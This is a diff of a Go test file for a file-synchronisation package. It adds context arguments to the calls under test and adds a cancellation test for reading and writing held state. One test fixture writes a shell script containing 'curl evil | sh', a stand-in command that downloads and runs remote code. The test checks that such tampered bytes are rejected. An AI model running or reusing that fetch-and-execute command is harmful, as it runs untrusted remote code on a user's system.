@@ -2,6 +2,7 @@ package files
 
 import (
 	"bytes"
+	"context"
 	"crypto/ed25519"
 	"crypto/rand"
 	"encoding/json"
@@ -87,7 +88,7 @@ func (p *person) turn(t *testing.T, from *person) error {
 	t.Helper()
 
 	p.at(t)
-	_, err := p.k.once(p.fetching(from))
+	_, err := p.k.once(t.Context(), p.fetching(from))
 	return err
 }
 
@@ -119,7 +120,7 @@ func TestAChangeCannotRecordAnUnsendablePath(t *testing.T) {
 	p := joins(t, "alice")
 	p.at(t)
 
-	err := p.k.record([]Edit{{Path: strings.Repeat("x", MaxRel+1)}})
+	err := p.k.record(t.Context(), []Edit{{Path: strings.Repeat("x", MaxRel+1)}})
 	if err == nil {
 		t.Fatal("a path longer than the protocol limit was recorded")
 	}
@@ -149,7 +150,7 @@ func TestHeldStateKeepsItsExistingJSONFormat(t *testing.T) {
 	}
 
 	var got, hashed bytes.Buffer
-	if err := writeHeld(&got, &hashed, held); err != nil {
+	if err := writeHeld(t.Context(), &got, &hashed, held); err != nil {
 		t.Fatalf("writeHeld(): %v", err)
 	}
 	if !bytes.Equal(got.Bytes(), want) {
@@ -160,19 +161,35 @@ func TestHeldStateKeepsItsExistingJSONFormat(t *testing.T) {
 	}
 }
 
+func TestHeldStateWorkStopsWithItsContext(t *testing.T) {
+	ctx, cancel := context.WithCancel(t.Context())
+	cancel()
+
+	if _, err := readHeld(ctx, strings.NewReader(`{"one":{}}`), MaxPaths); !errors.Is(err, context.Canceled) {
+		t.Fatalf("readHeld() = %v, want context cancellation", err)
+	}
+	var wrote, hashed bytes.Buffer
+	if err := writeHeld(ctx, &wrote, &hashed, map[string]mark{"one": {}}); !errors.Is(err, context.Canceled) {
+		t.Fatalf("writeHeld() = %v, want context cancellation", err)
+	}
+	if wrote.Len() != 0 || hashed.Len() != 0 {
+		t.Fatal("a cancelled held record was partially written")
+	}
+}
+
 func TestMalformedHeldStateIsRebuilt(t *testing.T) {
 	p := joins(t, "alice")
 	if err := os.WriteFile(p.k.mark(), []byte("{"), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
-	if err := p.k.recall(); err != nil {
+	if err := p.k.recall(t.Context()); err != nil {
 		t.Fatalf("recall(): %v", err)
 	}
 	if len(p.k.held) != 0 {
 		t.Fatalf("malformed state left %+v", p.k.held)
 	}
-	if err := p.k.remember(); err != nil {
+	if err := p.k.remember(t.Context()); err != nil {
 		t.Fatalf("remember(): %v", err)
 	}
 	if raw, err := os.ReadFile(p.k.mark()); err != nil || string(raw) != "{}" {
@@ -190,7 +207,7 @@ func TestOversizedHeldStateIsRefusedEveryTime(t *testing.T) {
 	}
 
 	for attempt := range 2 {
-		if err := p.k.recall(); err == nil {
+		if err := p.k.recall(t.Context()); err == nil {
 			t.Fatalf("recall attempt %d accepted oversized state", attempt+1)
 		}
 	}
@@ -213,7 +230,7 @@ func TestHeldStateIgnoresEntriesItCouldNotHaveWritten(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	if err := p.k.recall(); err != nil {
+	if err := p.k.recall(t.Context()); err != nil {
 		t.Fatalf("recall(): %v", err)
 	}
 	if len(p.k.held) != 1 || p.k.held["valid.txt"].Sum != sum {
@@ -230,14 +247,14 @@ func TestHeldStateStopsAtItsPathLimit(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if _, err := readHeld(bytes.NewReader(raw), 1); err == nil {
+	if _, err := readHeld(t.Context(), bytes.NewReader(raw), 1); err == nil {
 		t.Fatal("readHeld() accepted more paths than its limit")
 	}
 }
 
 func TestHeldStateStopsBeforeAllocatingAnOversizedToken(t *testing.T) {
 	raw := `{"` + strings.Repeat("x", maxHeldString+1) + `":{}}`
-	if _, err := readHeld(strings.NewReader(raw), MaxPaths); !errors.Is(err, errHeldToken) {
+	if _, err := readHeld(t.Context(), strings.NewReader(raw), MaxPaths); !errors.Is(err, errHeldToken) {
 		t.Fatalf("readHeld() = %v, want an oversized token", err)
 	}
 }
@@ -252,7 +269,7 @@ func TestHeldStateCarriesAMaximumEscapedPath(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	held, err := readHeld(bytes.NewReader(raw), MaxPaths)
+	held, err := readHeld(t.Context(), bytes.NewReader(raw), MaxPaths)
 	if err != nil {
 		t.Fatalf("readHeld(): %v", err)
 	}
@@ -264,14 +281,14 @@ func TestHeldStateCarriesAMaximumEscapedPath(t *testing.T) {
 func TestUnchangedHeldStateIsNotReplaced(t *testing.T) {
 	p := joins(t, "alice")
 	p.k.held = map[string]mark{"one.txt": {Sum: blake3.Sum256([]byte("one")), Size: 3, At: 1}}
-	if err := p.k.remember(); err != nil {
+	if err := p.k.remember(t.Context()); err != nil {
 		t.Fatalf("first remember(): %v", err)
 	}
 	before, err := os.Stat(p.k.mark())
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := p.k.remember(); err != nil {
+	if err := p.k.remember(t.Context()); err != nil {
 		t.Fatalf("second remember(): %v", err)
 	}
 	after, err := os.Stat(p.k.mark())
@@ -779,7 +796,7 @@ func TestBytesThatAreNotWhatTheChangeAsksForDoNotLand(t *testing.T) {
 		return os.WriteFile(w.Into, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o600)
 	}
 	b.at(t)
-	if _, err := b.k.once(swapped); err == nil {
+	if _, err := b.k.once(t.Context(), swapped); err == nil {
 		t.Fatal("bytes that are not what the change asks for were taken without complaint")
 	}
 	if _, err := os.Stat(filepath.Join(b.dir, "run.sh")); err == nil {
